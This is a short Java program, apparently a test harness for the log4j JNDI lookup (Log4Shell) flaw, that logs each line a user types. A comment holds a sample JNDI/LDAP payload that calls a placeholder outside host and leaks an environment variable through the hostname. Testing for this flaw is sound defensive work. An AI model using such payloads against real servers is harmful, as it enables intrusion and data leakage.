package com.company;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import java.util.Scanner;

public class Main {
    private static final Logger logger = LogManager.getLogger(Main.class);
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        Logger logger = LogManager.getLogger(Main.class);
        String val = "init";

        // ${jndi:ldap://${env:OS:-x}.test.example.com/whatever}
        while (val.length() > 0){
            System.out.print("Enter a value for logging test:");
            val =scanner.nextLine();
            if (val.length()>0)
                logger.error(val);
        }
    }
}
